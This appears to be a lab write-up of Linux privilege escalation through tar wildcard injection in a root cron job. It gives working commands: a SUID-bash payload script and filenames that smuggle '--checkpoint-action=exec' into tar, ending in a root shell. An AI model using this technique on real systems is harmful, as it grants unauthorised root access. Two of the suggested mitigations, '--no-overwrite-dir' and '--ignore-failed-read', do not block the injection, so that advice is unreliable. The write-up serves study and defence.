
## Privilege Escalation – Cron Job (Tar Wildcard Injection)

## 🔍 Enumeration

Cron jobs and the associated script were enumerated:

```bash
cat /etc/crontab
cat /usr/local/bin/compress.sh
```
Cron Entry:

```bash 
* * * * * root /usr/local/bin/compress.sh

```
Script Content:

```bash
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *
```
## Analysis
* The cron job runs as root every minute
* The script changes directory to /home/user, which is user-controlled
* The tar * wildcard is expanded unsafely
* tar supports the option --checkpoint-action=exec, which can be abused
* This leads to tar wildcard injection

## Exploitation
Step 1: Create a malicious payload
```bash
echo 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash' > /home/user/runme.sh
chmod +x /home/user/runme.sh
```
Step 2: Create tar option injection files
```bash
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=sh\ runme.sh
```
These filenames are interpreted by tar as command-line options during wildcard expansion.

Step 3: Wait for cron execution
Wait for the cron job to run, then execute the SUID bash binary:

```bash -p
/tmp/bash -p
```
 Result
```bash
bash-4.1# whoami
root
```
 Privilege escalation successful

##  Mitigation
1.) Never use wildcards (*) in root-owned cron jobs
 
2.) Use safer tar options such as:

```bash
--no-overwrite-dir
--ignore-failed-read
```
3.) Execute cron scripts from read-only directories

4.) Validate and sanitize arguments passed to tar before execution

